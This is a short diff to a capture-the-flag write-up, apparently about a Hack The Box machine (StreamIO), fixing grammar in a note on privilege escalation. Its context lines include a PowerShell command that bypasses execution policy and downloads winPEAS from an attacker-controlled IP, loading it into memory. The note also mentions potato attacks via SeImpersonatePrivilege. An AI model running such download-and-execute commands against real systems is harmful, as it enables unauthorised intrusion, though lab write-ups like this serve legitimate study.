@@ -1142,7 +1142,7 @@ powershell -ep bypass
 $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "http://10.10.14.21/win/winpeas.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
 ```
 
-`yoshihide` have `SeImpersonatePrivilege` token, which can be used for potato attacks to `NT Authority SYSTEM`, the section will be wrote in [Additional](#Additional) at the bottom
+- `yoshihide` has `SeImpersonatePrivilege` token, which can be used for potato attacks to `NT Authority SYSTEM`, the section will be wrote in [Additional](#Additional) at the bottom
 
 ```bash
 PS C:\inetpub\streamio.htb\admin> whoami /all
